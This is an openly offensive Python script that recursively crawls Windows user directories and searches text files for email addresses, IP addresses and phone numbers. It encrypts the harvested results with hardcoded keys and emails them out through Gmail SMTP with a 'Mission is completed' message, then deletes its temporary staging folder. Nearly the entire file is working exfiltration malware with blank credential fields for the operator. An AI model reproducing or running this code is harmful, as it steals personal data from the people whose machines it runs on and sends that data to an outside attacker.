# Built-in modules #
import logging
import os
import pathlib
import re
import shutil
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from hashlib import sha512
from time import time

# External modules #
from cryptography.fernet import Fernet


'''
########################################################################################################################
Name:       main
Purpose:    Recursively crawls through user directories, searching through files for regex matches to log to a text \
            file to encrypt and exfiltrate via email.
Parameters: None
Returns:    None
########################################################################################################################
'''
def main():
    start = time()
    print('Crawling ...')

    # Create storage path for data to be exfiltrated #
    pathlib.Path('C:/Tmp').mkdir(parents=True, exist_ok=True)
    path = 'C:\\Tmp\\'
    # Compile regex for searching #
    re_txt = re.compile(r'.+\.txt$')
    re_email = re.compile(r'^.+@(?:gmail|yahoo|hotmail|aol|msn|live|protonmail)\.com')
    re_ip = re.compile(r'(?:\s|^)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    re_phone = re.compile(r'(1?)(?:\s|^)[0-9]{3}-[0-9]{3}-[0-9]{4}')

    # Open the crawl log to record matches #
    with open(f'{path}crawlLog.txt', 'a') as log:
        # Iterate recursively through paths, directories, and files in path #
        for dir_path, dir_names, file_names in os.walk('C:\\Users\\', topdown=True):
            log.write(f'Path => {dir_path}\n')
            # Iterate through directories and log names #
            for d in dir_names:
                log.write(f'Dir => {d}\n')
            log.write('\n')
            # Iterate through files and log names #
            for file in file_names:
                log.write(f'File => {file}\n')
                # If file matches regex #
                if re_txt.match(file):
                    try:
                        # Open the file, iterating line by line #
                        with open(f'{dir_path}\\{file}', 'r') as search_file:
                            for line in search_file:
                                print(line)
                                # If line matches a regular expression #
                                if re_email.search(line) or re_ip.search(line) or re_phone.search(line):
                                    # Write results to match file #
                                    with open(f'{path}crawlMatches.txt', 'a') as details:
                                        details.write(f'Path => {dir_path}\n')
                                        details.write(f'File => {file}\n')
                                        details.write(f'Match => {line}\n\n')

                    except Exception as ex:
                        logging.exception(f'* Error Occurred: {ex} *')
                        pass
                        
            log.write('\n')

    # Hash the data #
    key = b'UR58Mz1VHiGJa1_W42E4G0FD__Ihb4vevs3wmWhVtOc='
    for _, _, file_names in os.walk(path):
        for file in file_names:
            sha = sha512(str.encode(file))
            with open(path + 'SHA_Hashes.txt', 'a') as hash_plain:
                hash_plain.write(f'{file}\nPlain Text SHA:\n{str(sha)}\n')

            with open(f'{path}{file}', 'rb') as plain_text:
                data = plain_text.read()
            encrypted = Fernet(key).encrypt(data)

            with open(f'{path}e_{file}', 'ab') as encrypted_text:
                encrypted_text.write(encrypted)
            e_sha = sha512(str.encode(f'e_{file}'))

            with open(f'{path}SHA_Hashes.txt', 'a') as hash_encrypt:
                hash_encrypt.write(f'{file}\nEncrypted SHA:\n{str(e_sha)}\n\n')

    # Encrypt file with hashes #
    hash_key = b'AP92lIGyU8Zqnc568KT5ugjInAo28qwBuB5fzWYQfz0='
    with open(f'{path}SHA_Hashes.txt', 'rb') as plain_text:
        data = plain_text.read()
    encrypted = Fernet(hash_key).encrypt(data)

    with open(f'{path}e_SHA_Hashes.txt', 'ab') as encrypted_text:
        encrypted_text.write(encrypted)

    # Populate email header and body #
    email_address = ''                          # <= Enter email address
    password = ''                               # <= Enter password
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    msg.attach(MIMEText(body, 'plain'))
    re_email = re.compile(r'^e_.+\.txt$')

    # Iterate though result files and attach to email #
    for _, _, file_names in os.walk(path):
        for file in file_names:
            if re_email.match(file):
                p = MIMEBase('application', 'octet-stream')
                with open(path + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;'   
                             'filename = {}'.format(file)) 
                msg.attach(p)
            else:
                pass

    # Send the message through Gmail #
    try:
        s = smtplib.SMTP('smtp.gmail.com', 586)
        s.starttls()
        s.login(email_address, password)
        s.sendmail(email_address, email_address, msg.as_string())
        s.quit()
    except smtplib.SMTPException:
        pass

    # Clean up #
    shutil.rmtree('C:\\Tmp')
    print('\nAll Done!!')
    print(time() - start)


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('Ctrl+C detected .. exiting')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, filename='C:/Tmp/error_log.txt')
        logging.exception(f'* Error Occurred: {ex} *')
        pass
